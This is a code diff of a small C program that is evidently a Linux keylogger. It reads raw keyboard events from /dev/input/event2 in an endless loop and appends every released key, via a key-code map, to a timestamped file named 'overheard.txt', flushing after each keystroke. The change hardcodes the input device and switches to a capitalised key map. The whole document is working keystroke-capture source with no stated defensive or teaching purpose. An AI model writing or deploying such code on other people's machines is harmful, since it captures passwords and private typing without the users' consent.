@@ -16,40 +16,33 @@
 #include "keymap.h"
 
 
-int main(int argc, char **argv) {
-	FILE *recording;
-	int i = 0;
-	int listening;
-	int kbhit(void);				/* detects keyboard hit via time */
-	struct input_event ev;			/* using input_event so we 
-									 * know what we're reading 
+int main(void) {
+	FILE *evlog;
+	int fd;
+	fd = open("/dev/input/event2", O_RDONLY|O_TRUNC|O_NONBLOCK);	/* opens the event file */
+	struct input_event ev;			/* using input_event so we know 
+									 * what we're reading from the 
+									 * event file 
 									 */
-	time_t curtime;
-	time(&curtime);
-	listening = open(argv[1], O_RDONLY|O_TRUNC|O_NONBLOCK);	/* opens the event file */
+	evlog = fopen("overheard.txt", "a+");  	/* opens/creates the log */
 
-	if(argc < 2) {
-		printf("USAGE: %s <device>\n", argv[0]);
-		return 1;
-	}
-
-	recording = fopen("overheard.txt", "a+");  	/* opens/creates the log */
-	setbuf(recording, NULL);					/* forces immediate write to recording */
-	
-	if (recording == NULL) {
+	if (evlog == NULL) {
 		fprintf(stderr, "ERROR: Log file not found\n");
 		return 1;
 	}
 
-	fprintf(recording, "\n\n%s", ctime(&curtime));	/* adds timestamp */
+	time_t curtime;
+	time(&curtime);
+	fprintf(evlog, "\n\n%s", ctime(&curtime));
+	
 	while(1) {
-		read(listening, &ev, sizeof(struct input_event));
+		read(fd, &ev, sizeof(struct input_event));
 		if(ev.value == 0 && ev.type == 1) {			/* only register release state */
-			fprintf(recording, "%s", KeyMap[ev.code]);
+			fprintf(evlog, "%s", CapKeyMap[ev.code]);
+			fflush(evlog);
 		}
 	}
 
-	fclose(recording);
-
+	fclose(evlog);
 	return 0;
 }
